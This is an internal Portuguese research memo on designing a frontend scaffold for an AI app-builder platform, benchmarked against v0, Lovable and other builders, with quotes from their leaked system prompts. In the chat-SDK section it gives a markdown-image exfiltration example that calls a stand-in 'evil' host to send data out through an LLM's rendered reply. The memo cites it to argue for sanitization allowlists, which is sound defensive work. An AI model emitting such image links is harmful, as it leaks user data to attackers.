# Pesquisa interna — scaffold + frontend (tópico 8)

> **Natureza.** Pesquisa interna do tópico 8, conduzida em 2026-08-11 por 4 varreduras paralelas
> de fontes primárias (docs oficiais, repos, changelogs, prompts vazados corroborados,
> benchmarks), cada uma cobrindo clusters das 10 perguntas do
> [prompt externo](pesquisa-externa-scaffold-prompt.md). Todo achado marcado como **fato** (URL
> verificada em 2026-08-11) ou **inferência**; "não documentado publicamente" quando for o caso.
> Confrontada com a evidência primária Mitra ([07-padrão](../reference/mitra/07-padrao-de-projeto.md),
> C-009), o Marketplace Central medido e o design system extraído dele, e os requisitos HAR-5/HAR-6
> ([03](03-requisitos.md)). Insumo para cruzar com o HANDOFF da deep research externa antes da
> revisão adversarial (Codex) e ratificação.

---

## Q1 — Anatomia: template rico + stack fixa é convergência do mercado; anti-slop tem 2 andares

**Fatos.**

- **v0 (Vercel)**: prompt vazado (repo x1xhlol, corroborado por 2ª fonte independente jujumilk3) —
  projeto default Next.js App Router com arquivos que **já existem e o agente é proibido de
  regenerar**: `app/layout.tsx`, `globals.css` shadcn, `components/ui/*` inteiro pré-instalado,
  `lib/utils.ts`, configs. Diretiva literal: "All Projects come with a default set of files...
  you never generate these unless explicitly requested". Anti-slop no prompt: "ALWAYS use exactly
  3-5 colors total", máx. 2 famílias de fonte, tokens semânticos em vez de `bg-white`, escala de
  espaçamento em vez de valores arbitrários.
- **v0 pipeline oficial**: qualidade não vem só do template — modelo próprio de correção
  (`vercel-autofixer-01`) corrige erros **durante o streaming** + autofixers determinísticos.
  Benchmark publicado: 93,87% gerações sem erro vs 78,43% do Claude 4 Opus puro.
- **Lovable**: prompt vazado — "built on top of React, Vite, Tailwind CSS, and TypeScript";
  explicitamente NÃO suporta Angular/Vue/Svelte/Next. Design system obrigatório: "never write
  custom styles in components", HSL em `index.css`/config, proibido `text-white` direto, shadcn
  customizado via variants. Docs oficiais: **cada geração é escaneada** contra o design system
  (cor crua, valor one-off, inline style, componente local duplicando o do kit) e a plataforma
  **re-tenta automaticamente** antes de terminar. Novos apps Enterprise (jun/2026) = TanStack
  Start com SSR; apps antigos = Vite+React padrão.
- **Base44**: React + React Router + Vite + Tailwind + shadcn/ui; estrutura padronizada `pages/`
  (arquivo=rota), `components/ui/` pré-built, `api/` com cliente SDK **pré-configurado**,
  `entities/` geridos pela plataforma (fora do repo local).
- **Replit**: custom templates = repo com `replit.md` (memória viva do projeto), instruções de
  organização e skills; ao selecionar, Agent forka e **pula a fase de planejamento**. Antes, só
  "curated app types... built to work seamlessly with Agent".
- **Bolt.new** (contra-exemplo, prompt oficial open-source): template ~zero; restrições vêm do
  runtime WebContainer, não de design. Domínio = "qualquer app no browser", não consistência de
  app de negócio.

**Inferências.** Convergência clara dos builders de app de negócio (v0, Lovable, Base44) para a
MESMA família: React + Tailwind + shadcn com componentes pré-instalados intocáveis. Anti-slop
opera em **2 andares**: (1) decisões herdadas do scaffold + regras de design no prompt;
(2) **gate mecânico pós-geração com autocorreção** (scan Lovable, AutoFixer v0). Nenhum player
confia em só um dos andares. Nenhuma ablação pública "template rico = +X%" — evidência é
estrutural. Escolha do shadcn (código no repo, visível ao modelo) coerente com agentes —
inferência, nenhum vendor afirma.

**Confronto Mitra/acervo.** Sonda C-009 e 07-padrão dizem o mesmo em dados próprios: scaffold
byte-idêntico da Mitra garante o **piso, não o teto** (força Média); qualidade alta vem de
protocolo+SDK+docs (forças Altas). O 2º andar do mercado (scan+retry) é exatamente o que a Mitra
NÃO tem e a nossa sonda apontou como lacuna: só invariante mecânica reprova. HAR-5/HAR-6
validados, mas com correção: template é necessário e **insuficiente** — ver Q6.

**Posição Conexus.** Template rico com stack fixa e kit pré-instalado que o agente não regenera
(padrão v0/Lovable/Base44). Diretivas anti-slop no CLAUDE.md do template (tokens sim, cor crua
não). E o gate de aderência ao design system entra como **gate mecânico de 1ª classe** no
pipeline de build — não só como regra de prompt.

## Q2 — Versionamento e drift: mercado não migra; âncora de digest no dia 1 é o barato que preserva opções

**Fatos.**

- **Default do mercado: app fica no scaffold em que nasceu.** Nenhum builder (v0, Bolt, Base44,
  Databutton, Create.xyz, Replit) documenta migração de scaffold antigo→novo. Não documentado
  publicamente.
- **Lovable é a exceção (28/07/2026)**: upgrade in-place Vite+React → TanStack Start, **assistido
  pelo próprio agente** (não codemod, não regeneração), cobrado em créditos, com revert via
  version history. Também **versiona o design system**: projeto registra a versão anexada + prompt
  "Update available".
- **shadcn = dataset público do custo do escape hatch total**: issue #2619 — diff é "an unversioned
  update mechanism, which also reverts all your customization" (fechada Stale); discussion #7170 —
  "once you install... they become your code"; caminho prático = `--overwrite` (destrói
  customização) ou merge manual. Mitigação comunitária convergida: **wrappers/CSS overrides em vez
  de editar o copiado**. CLI oficial nem documenta workflow de update.
- **Três modelos maduros de reconciliação, todos fora dos AI builders**: (a) **3-way merge
  ancorado em digest** — cruft (`.cruft.json` com git hash do template; `cruft check` falha CI se
  driftou; PR automático semanal) e copier (answers file + git tags obrigatórios; regenera fresh,
  extrai diff das customizações, reaplica); (b) **regeneração de zona não-editável** — Expo CNG
  (`expo prebuild --clean` apaga e regenera diretórios nativos; customização SÓ via config
  plugins declarativos; resolveu o "number one weakness" do RN); (c) **codemods** — Next.js
  (`@next/codemod upgrade` roda não-interativo "by an AI coding agent or in CI" — já desenhado
  para agentes), Nx migrate (agora com migrações "prompt-based" que exigem IA + generator-based
  determinísticas), Codemod.com (parceria oficial React).
- degit/Turborepo examples: zero mecanismo de update posterior.

**Inferências.** "Byte-controlado" e "escape hatch" (HAR-5) só conciliam com **camadas**: zona
regenerável (arquivos que o app não edita — atualizáveis byte-a-byte estilo Expo CNG) + zona
app-owned (escape real estilo shadcn — que a plataforma assume publicamente que só migra via
merge/codemod/agente). Nenhum builder grava digest do scaffold no app; cruft/copier provam que a
âncora (digest + versão + respostas de geração) é o que torna QUALQUER estratégia futura de
update possível. Estado da arte 2026 quando se migra: regeneração assistida por agente com âncora
+ revert barato (Lovable) ou híbrido codemod+LLM (Nx).

**Confronto acervo.** Nosso registro C-005 já é CAS com digest — a âncora do scaffold é o mesmo
padrão aplicado ao template. Mitra: scaffold byte-idêntico sem âncora documentada nem história de
migração (greenfield só — exatamente o alerta da sonda T16).

**Posição Conexus.** (1) Âncora no app desde o dia 1: arquivo com digest do template + versão +
parâmetros de geração — custo ~zero, não-retrofitável. (2) HAR-5 redesenhado em 2 zonas por
arquivo: infra/gates/configs = regenerável e read-only; UI/features = app-owned. (3) Estratégia
de migração NÃO se decide agora — a âncora + zonas preservam os 3 caminhos; gatilho = 2º app em
scaffold defasado.

## Q3 — UI-kit: copy-in via registry próprio; enforcement em 3 camadas com precedente público

**Fatos.**

- **Registry shadcn é O mecanismo de distribuição** do ecossistema: `registry-item.json` (schema
  público) com `cssVars.theme/light/dark`, docs, meta; tipos `registry:ui/block/theme/style/base`.
- **CLI 3.0 (ago/2025)**: registries namespaced `@registry/name`, **registries privados** com
  bearer/API-key via `${REGISTRY_TOKEN}`, **MCP server zero-config** (`shadcn@latest mcp init` —
  funciona com Claude Code: agente descobre/instala componentes pelo MCP). Mai/2026: composição
  via `include` + `shadcn registry validate` para CI. Jul/2026: busca dinâmica server-side.
- **Fraqueza do copy-in**: fix no kit não propaga — nenhum mecanismo público de diff/re-sync.
  Mitigação de mercado: upgrade como tarefa de agente + versão gravada no meta (Lovable versiona
  o design system anexado — Q2).
- **Enforcement que o agente use o kit — 3 camadas com precedente**: (1) catálogo no contexto via
  MCP/registry; (2) `no-restricted-imports` com mensagens custom ("use @kit/Button, não
  @radix-ui/*" — barato, nativo ESLint); (3) **regras de lint custom estilo
  eslint-plugin-primer-react** (GitHub Primer): regras que codificam política de design system —
  precedente direto para "todo `<Metric>` exige prop `source`".
- Analogia jest-axe: asserção em runtime de teste pega o que lint estático não vê (~30% de
  escape documentado no caso a11y — calibra expectativa: lint não pega tudo).

**Confronto acervo.** Design system já existe (extraído do Marketplace Central, sessão paralela):
tokens Tailwind v4 `@theme` + ~20 componentes com grupos core/data/feedback/shell/board,
`_ds_manifest.json` (catálogo com metadata) e `_adherence.oxlintrc.json` (regras de aderência já
esboçadas). O formato é convertível para registry-item.json sem retrabalho conceitual. Mitra
distribui UI-kit por cópia byte-idêntica sem registry nem enforcement de lint — nosso desenho
supera com ferramenta padrão de mercado.

**Posição Conexus.** Copy-in (o app é dono; código visível ao agente) distribuído por **registry
próprio servido pelo hub** no formato registry-item.json (compatível com CLI shadcn + MCP =
ferramenta que o agente builder já sabe usar, zero tooling próprio). Versão do kit gravada no
app (âncora Q2). Enforcement nas 3 camadas: manifest/MCP no contexto + `no-restricted-imports` +
regras custom de aderência (as `_adherence` do design system viram regras de verdade). Theming =
tokens `@theme` por projeto sobre o mesmo kit.

## Q4 — Stack: Vite SPA confirmado; TanStack Query/Table; router é a única escolha aberta

**Fatos.**

- **Lovable gera Vite+React+Tailwind+shadcn+React Router SPA** (não Next) — o builder mais
  próximo do nosso caso valida a nossa base medida. State of JS 2025: Vite ~98% satisfação.
  TanStack Start = RC em set/2025, jovem (Lovable adotou para Enterprise/SSR — caso deles, não
  nosso: app interno de negócio não precisa SSR/SEO).
- **Router**: React Router = vantagem de corpus (o que os modelos mais viram); TanStack Router =
  search params **tipados** (filtro/estado de tabela densa na URL com validação). Viável para
  agente SE o template entrega as rotas como esqueleto pronto (o agente preenche páginas, não
  inventa roteamento).
- **TanStack Query** = lib de data-fetching dominante; padrão canônico `queryOptions()`:
  `queryOptions({queryKey: [slug, input], queryFn: () => execute(slug, input)})` — colocação
  1:1 com nosso SDK. Zustand SÓ para estado de UI; regra simples: "se veio do `execute()`, mora
  no Query".
- **Forms**: RHF + zodResolver (auto-detecta Zod v3/v4) reusando os inputSchemas do registro =
  validação sem duplicação de schema.
- **Tabela densa**: TanStack Table (headless) + TanStack Virtual; virtualização obrigatória
  >~1K linhas; 10K–50K ok com sort/filter no servidor. Headless permite `<table>` semântica —
  padrão APG sortable-table (não role=grid) = piso de a11y sem custo extra.
- **TS**: 6.0 (mar/2026) estável; TS 7 (compilador Go, ~10x) GA jul/2026 — strict é dado.
- **pt-BR/Intl**: `Intl.NumberFormat`/`DateTimeFormat` nativos cobrem BRL/datas —
  `formatters.ts` zero-dependência no template.

**Confronto acervo.** Marketplace Central medido: React SPA + Vite + Tailwind v4, 20 rotas,
898KB, tabelas densas o dia todo — a stack proposta é a stack já validada em produção, com
TanStack Query/Table/Virtual como upgrades pontuais do que lá é manual. Mitra: mesma base
(SPA React+Vite + env injetado + SDK runtime).

**Posição Conexus.** React + Vite SPA + TS strict + Tailwind v4 tokens. TanStack Query
(queryOptions), Zustand UI-only, RHF+zodResolver sobre schemas do registro, TanStack
Table+Virtual com `<table>` semântica, Intl nativo. Router: **pendente de cruzamento** — lean
TanStack Router (search params tipados valem muito para tabela densa; esqueleto de rotas no
template neutraliza a desvantagem de corpus), React Router como fallback conservador.

## Q5 — SDK de runtime: manifest gerado é obrigatório; envelope desembrulha na fronteira do Query; sanitização do chat mora no template

**Fatos.**

- **Inferência estilo tRPC é impossível cross-runtime**: o registro vive fora do bundle do app →
  o tipo tem que ser GERADO. Padrão openapi-fetch: um único tipo manifest + mapped types:
  `execute<S extends keyof Manifest>(slug: S, input: Manifest[S]["input"]):
  Promise<Result<Manifest[S]["output"], ErroEnvelope>>`. Codegen: Hey API é o front-runner 2026
  (gera `queryOptions()` prontos, não hooks) — mas nosso gerador pode ser trivial (schemas já são
  Zod/JSON Schema no registro).
- **Envelope**: nenhum padrão público para "Result union × exceptions" na fronteira — decisão de
  design nossa. Prática dominante com TanStack Query: SDK retorna Result discriminado;
  `queryFn` desembrulha e **lança** o erro → Query cuida de retry/`isError`.
- **Chat embarcado**: AI SDK v5 = shape dominante (POST + SSE, UI-message-parts, transport
  plugável — casa com C-010).
- **Anti-exfil é real e documentado**: exfiltração via markdown-image (render de
  `![](https://evil/?q=<dados>)` em resposta de LLM) demonstrada contra ChatGPT, Bard, Copilot
  e outros. **Streamdown** (Vercel) = rehype-sanitize + rehype-harden com
  `allowedImagePrefixes`/`allowedLinkPrefixes`/`allowDataImages:false` — mas **defaults são
  permissivos; hardening é opt-in**. Se a allowlist não estiver no template, não existe.

**Confronto acervo.** C-005 já dá inputSchema+envelope discriminado por artefato — o SDK é
projeção disso no frontend. Mitra tem SDK runtime equivalente (`window.__mitraEnv` + funções
registradas) sem tipos gerados — nosso codegen é o upgrade. C-010 já exige renderer sanitizado
anti-exfil; achado novo: a sanitização é **configuração de template** (allowlist restrita a
origens do hub), não default de lib.

**Posição Conexus.** SDK mínimo no template: `execute()` tipado via manifest **gerado no build a
partir do registro** (codegen próprio trivial), Result desembrulhado na fronteira do
`queryFn`. Chat: shape AI SDK v5 + Streamdown com allowlists explícitas no template
(imagens/links só do hub; data-URIs off). Sessão via cookie do hub (Q9).

## Q6 — Gates mecânicos: o mercado validou a tese da sonda; pilha fase 1 custo ~zero

**Fatos.**

- **As 3 plataformas comerciais tratam detecção mecânica + autocorreção como núcleo do produto**:
  v0 AutoFixers determinísticos + modelo RFT dedicado (93,87% error-free vs 78,43% cru); Replit
  Agent 3 self-testing com browser real explicitamente contra "Potemkin interfaces"; Lovable
  "Try to fix" sobre logs + scan de design system por geração. Nenhuma usa revisão-por-LLM como
  gate primário.
- **tsc strict** com `noUnusedLocals`/`noUnusedParameters` = detector nativo de
  escrito-nunca-lido nível variável. **knip** = nível export/arquivo/dependência: 40M
  downloads/mês, usado por Adobe, Anthropic, AWS, Google, Microsoft, Vercel; falsos positivos em
  wiring dinâmico mitigados por config — **template fixo amortiza: tuna 1 vez, vale para todos os
  apps gerados**; modo `--production` mais estrito.
- **oxlint 1.0** (jun/2025, ~30x ESLint); type-aware em technical preview via tsgolint (1.152
  arquivos em 7,0s; ressalva oficial: monorepos grandes podem deadlock/OOM); JS Plugins alpha
  (~mar/2026) roda maioria dos plugins ESLint. **Biome v2**: type-aware sem tsc (~75% dos casos de
  `noFloatingPromises`); trade-off documentado: oxlint/tsgolint = fidelidade total, Biome = zero
  dependência do compilador.
- **Fronteiras de import**: eslint-plugin-boundaries (config no template, feedback no editor) vs
  dependency-cruiser standalone — que vale pelo `no-orphans` (detector de artefato órfão nível
  módulo, complementar ao knip).
- **Playwright component testing: experimental desde 2022, segue experimental em 2026** — sinal
  para não apostar. Screenshots (`toHaveScreenshot`): baseline por browser+OS, frágil entre
  máquinas (doc oficial cita até bateria vs tomada). Chromatic free = 5K snapshots/mês só Chrome;
  Argos free = 5K/mês.
- **size-limit** (Evil Martians): budget por app em 1 número, falha CI, comenta delta no PR;
  usado por MobX/MUI/Ant.
- **projen** (AWS): arquivos gerados **read-only com anti-tamper no CI** — editar arquivo gerado =
  falha determinística.

**Confronto C-009.** Convergência total com a sonda: só invariante mecânica reprova; "artefato
órfão = detector mais barato de garantia quebrada" tem agora a versão industrializada (knip +
`no-orphans` + `noUnusedLocals` em 3 níveis). O 2º andar (scan de aderência + autocorreção) é o
que falta na Mitra e o mercado provou que é produto, não luxo.

**Posição Conexus (pilha fase 1, ordem de execução).** (1) tsc strict com noUnusedLocals;
(2) oxlint (regras custom que faltarem ficam num ESLint residual só com os plugins de aderência);
(3) knip tunado no template; (4) **gate de aderência ao design system** (cor crua, valor one-off,
inline style, import proibido, prop de honestidade faltando); (5) smoke Playwright E2E — 1 teste
por app: rota carrega, elemento-chave presente, zero erro de console/rede; (6) size-limit;
(7) anti-tamper da zona read-only (Q2). Loop de autocorreção: falha de gate volta para o agente
com o log (padrão Lovable/v0). **Adiar com gatilho**: boundaries plenas (scaffold com camadas
estáveis), visual regression (quando houver baseline que valha; então Playwright screenshots no
próprio hub, não Chromatic).

## Q7 — Honest UI: oceano azul confirmado; regra de produto vira lint custom

**Fatos.**

- **Nenhum design system público formaliza proveniência de número de negócio como componente.**
  Varredura em observabilidade/BI/fintech/gov: o mercado resolve honestidade na camada de
  pipeline/catálogo, não na UI do app — Tableau Catalog (data-quality warning com badge de alta
  visibilidade auto-propagado a jusante), dbt source freshness (`warn_after`/`error_after` com
  exit code). Não documentado publicamente = ninguém tem SourceStamp/UnknownValue como componente.
- **GOV.UK Analysis Function** = âncora de vocabulário para "não medido": símbolos padronizados
  `[x]` not available / `[c]` confidential / `[z]` not applicable; célula em branco = má prática;
  "NA" ambíguo é proibido. Grafana EmptyState = 3 variantes grossas (call-to-action/not-found/
  completed) — piso abaixo do nosso requisito de causa específica; GOV.UK nem tem empty-state
  publicado (issue #264 no backlog).
- **C2PA Content Credentials** = único badge de proveniência padronizado — e é só para mídia.
- **Enforcement**: precedente Primer (Q3) — regra de lint custom que exige prop
  ("todo `<Metric>` exige `source`"); asserção em teste para o que lint não alcança.

**Confronto acervo.** As 5 regras não-negociáveis do Marketplace Central (número com
fonte+data+N, empty state explicado, amostra declarada, "não medido" 1ª classe, rótulo não
exagera) **já viraram componentes reais** no design system: SourceStamp, UnknownValue,
SampleBanner, EmptyState, StatCard. Ou seja: a parte difícil (componentes extraídos de app real)
está feita; falta a parte mecânica (lint+teste).

**Posição Conexus.** Honest UI = diferencial de produto sem concorrente direto. Materialização:
(1) componentes de honestidade do design system = parte obrigatória do kit; (2) regras viram
lint custom de aderência (Q3/Q6): número fora de `<StatCard>`/`<Metric>` com `source` = erro,
`<DataTable>` sem empty-state com causa = erro, tela com amostra parcial sem `<SampleBanner>` =
erro; (3) vocabulário do estado "não medido" alinhado a GOV.UK ([x]/[z] → nossos estados); (4)
propagação estilo Tableau: badge de qualidade nasce no registro/Brain (C-011 health) e o
componente só EXIBE — a fonte da verdade é o backend, não a tela.

## Q8 — Publish US$0: hub + Caddy é a única rota com preview privado real; CAS já decidido é o padrão certo

**Fatos.**

- **Preview privado a US$0 não existe em free tier via senha**: Vercel Password Protection =
  Enterprise ou US$150/mês add-on (Hobby protege previews via Vercel Auth, produção fica
  pública); Netlify password = Pro+; Cloudflare Pages = Access policy (login e-mail/SSO free até
  50 users, não senha simples); GitHub Pages = nem tem (e Pages de repo privado exige Pro, site
  sai público).
- **Cloudflare**: Pages free = builds 500/mês, bandwidth ilimitado, 20K arquivos/site; mas
  Cloudflare recomenda **Workers static assets** para projetos novos.
- **Padrão atômico**: `releases/<ts>/` + symlink `current` (rename atômico, rollback <1s) —
  isomorfo do nosso CAS (`current -> releases/X` ≡ ponteiro → bundle@sha256). Cache: asset com
  digest no nome = `immutable, max-age=1y`; `index.html` (o ponteiro) = `no-cache` — senão browser
  serve index velho apontando para chunks deletados.
- **Caddy**: padrão SPA documentado (`try_files {path} /index.html` + `file_server` + `handle
  /api/*` → reverse_proxy) = ~10 linhas; CA interna para HTTPS local; wildcard reutilizado.
- **LAN**: mDNS inconsistente com subdomínio multi-nível; `hosts` do Windows não faz wildcard.
  Opções: porta por projeto, **path por projeto** (`hub.local/app-x/`), ou domínio real barato +
  DNS wildcard → IP local.

**Confronto acervo.** Deployment atômico com manifesto+digest+CAS+rollback já decidido (C-005) —
a literatura valida; nada superior encontrado. Hub já existe e já é o proxy autenticado de
preview.

**Posição Conexus.** Fase 1: SPA servida pelo hub via Caddy, **path por projeto**, assets
immutable-por-digest + index no-cache, deploy = troca de ponteiro CAS, preview privado atrás do
próprio hub. Válvula de escape futura nomeada: Cloudflare **Workers static assets** (não Pages).
Custo: US$0, zero serviço novo.

## Q9 — Fronteira de auth: slot authProvider; demo-login honesto tem precedente; nosso runtime já é BFF

**Fatos.**

- **Padrão de slot**: interface `authProvider` (Refine/react-admin) — contrato pequeno
  (login/logout/checkAuth/getIdentity/getPermissions) trocável sem tocar nas telas. Demo oficial
  do react-admin usa **fake authProvider** — precedente público de "login demonstrativo" honesto.
- **OWASP**: token nunca em localStorage; cookie HttpOnly/Secure/SameSite. **IETF
  browser-based-apps draft-27**: BFF fortemente recomendado sobre token no browser.
- Nosso runtime **já é BFF de fato**: todo tráfego de dado passa por `execute()` no hub — o
  browser nunca segura credencial de ERP nem token de API por design (C-005/C-007).

**Posição Conexus.** Template prevê: (1) slot `authProvider` com contrato mínimo; (2)
implementação fase 1 = demo-login honesto (perfis supervisor × operação, banner "sessão
demonstrativa" — componente de honestidade, não fingimento de segurança); (3) sessão = cookie
HttpOnly do hub, zero token no browser. T12 decide o resto; o slot não fecha nenhuma porta.

## Q10 — MVP e faseamento: app primeiro, template extraído depois; nosso design system já seguiu a ordem certa

**Fatos.**

- **Rule of three** (extrair abstração na 3ª ocorrência); Sandi Metz: "duplication is far
  cheaper than the wrong abstraction" (custo de duplicação linear, de abstração errada
  não-linear); Kent C. Dodds AHA: abstrair quando souber como a abstração funciona.
- **Design system cedo demais = erro clássico documentado**: consenso — antes de validação, UI
  kit básico; construir fluxos reais e **extrair de trás para frente**, não começar por botões.
- **Regeneração de apps quando template evolui: nenhum precedente nos AI builders** (não
  documentado publicamente); a linhagem é scaffold-updater (cruft/copier/projen).
- Monorepo-first como prática canônica de plataforma geradora: não documentado; guias existentes
  extraem `packages/ui` DEPOIS de >1 consumidor.

**Confronto acervo.** Nosso design system foi **extraído do Marketplace Central em produção** —
seguiu exatamente a ordem que a literatura recomenda (não é design-system-antes-de-app; é
extração de app real). O 07-padrão da Mitra dá os ADOPTs de processo que o template carrega:
2 estágios scope→build com estágio 2 auditando contra dado real, tasks.md com causa raiz, smoke
test com relato honesto, "Limitações conhecidas" + critérios numéricos de aceite como requisito
de entrega.

**Posição Conexus.** Ordem: (1) scaffold v0 mínimo-honesto para o caso 1 = design system
existente + esqueleto Vite/TS/rotas + SDK + gates — SEM abstração especulativa; (2) 1º app
(Analisador de Orçamentos) constrói SOBRE ele; (3) extração séria do template acontece entre o
1º e o 3º app, quando padrões reais aparecem (rule of three). O que fica de fora com gatilho
nomeado: estratégia de migração de scaffold (gatilho: 2º app em scaffold defasado), visual
regression (baseline estável), boundaries plenas (camadas estáveis), monorepo de template
(>1 consumidor do kit fora do scaffold), CDN externo (limite do hub/LAN).

---

## Correções à nossa direção (7)

1. **Template é necessário e insuficiente** (contra leitura forte do HAR-6): os 2 melhores
   players mantêm gate pós-geração com autocorreção (scan Lovable, AutoFixer v0). Nosso pipeline
   precisa do **gate de aderência ao design system** + loop falha→agente, não só
   tsc/lint/typecheck.
2. **HAR-5 "byte-controlado + escape hatch" só concilia em camadas**: zona regenerável read-only
   (infra/gates/configs, anti-tamper estilo projen) × zona app-owned (UI/features, estilo
   shadcn). Sem isso, ou o escape hatch destrói o byte-controle (lição shadcn) ou o byte-controle
   mata a customização.
3. **Âncora no dia 1**: digest do template + versão + parâmetros de geração gravados no app.
   Nenhum builder faz; cruft/copier provam que sem âncora nenhuma estratégia futura de update
   fica disponível. Custo ~zero, não-retrofitável.
4. **Sanitização do chat é config de template, não default de lib**: Streamdown/rehype-harden têm
   defaults permissivos; allowlist de imagem/link restrita ao hub + data-URI off têm que estar
   NO template, senão não existem (anti-exfil C-010 depende disso).
5. **Tipo do SDK tem que ser gerado**: inferência tRPC impossível com registro fora do bundle.
   Manifest type + mapped types no build — codegen próprio trivial sobre os schemas C-005.
6. **Playwright component testing morreu na praia** (experimental desde 2022): smoke E2E de
   página cheia no lugar; visual regression adiada e, quando vier, no hub — não Chromatic/SaaS.
7. **Preview privado US$0 só existe no hub**: nenhum free tier dá senha simples (Vercel
   US$150/mês, Netlify Pro, CF = login SSO). Publish fase 1 é o hub servindo — sem plano B
   externo gratuito para preview privado.

## Rascunho de decisão em 1 página (pré-cruzamento com a externa)

- **Anatomia**: template rico, stack fixa, kit pré-instalado que o agente não regenera (padrão
  v0/Lovable/Base44). Duas zonas por arquivo: regenerável read-only (configs/gates/build, com
  anti-tamper) × app-owned (páginas/features). Âncora com digest+versão do template no app desde
  o 1º scaffold. CLAUDE.md do template com diretivas anti-slop (tokens sim, cor crua não).
- **UI-kit**: copy-in via registry próprio servido pelo hub, formato registry-item.json
  (compatível CLI shadcn + MCP — agente descobre componentes com ferramenta que já conhece).
  Componentes de honestidade (SourceStamp, UnknownValue, SampleBanner, EmptyState...) =
  obrigatórios no kit. Versão do kit gravada no app. Theming = tokens `@theme` por projeto.
- **Stack**: React + Vite SPA + TS strict + Tailwind v4. TanStack Query (`queryOptions`),
  Zustand UI-only, RHF+zodResolver sobre schemas do registro, TanStack Table+Virtual com
  `<table>` semântica, Intl nativo pt-BR. Router: lean TanStack Router (search params tipados;
  esqueleto de rotas no template), React Router fallback — fecha no cruzamento.
- **SDK frontend**: `execute(slug, input)` tipado por manifest gerado no build (codegen próprio
  sobre C-005); Result desembrulhado no `queryFn` (Query cuida de retry/isError). Chat: shape
  AI SDK v5 + renderer com allowlists anti-exfil no template.
- **Gates (pipeline)**: tsc strict (noUnusedLocals) → oxlint → knip (tunado 1x no template) →
  aderência ao design system (incl. regras de honestidade como lint custom) → smoke Playwright
  E2E 1/app → size-limit → anti-tamper da zona read-only. Falha volta ao agente com log
  (autocorreção). Adiar: boundaries plenas, visual regression.
- **Publish**: hub + Caddy, path por projeto, immutable-por-digest + index no-cache, deploy =
  troca de ponteiro CAS, preview privado atrás do hub. Válvula futura: Cloudflare Workers static
  assets.
- **Auth**: slot `authProvider` mínimo; demo-login honesto com banner; sessão = cookie HttpOnly
  do hub; zero token no browser (runtime já é BFF). Resto = T12.
- **Faseamento**: scaffold v0 = design system existente + esqueleto + SDK + gates; 1º app
  constrói sobre ele; extração séria do template entre 1º e 3º app (rule of three). Gatilhos
  nomeados: migração de scaffold (2º app defasado), visual regression (baseline estável),
  monorepo (>1 consumidor externo), CDN (limite LAN).
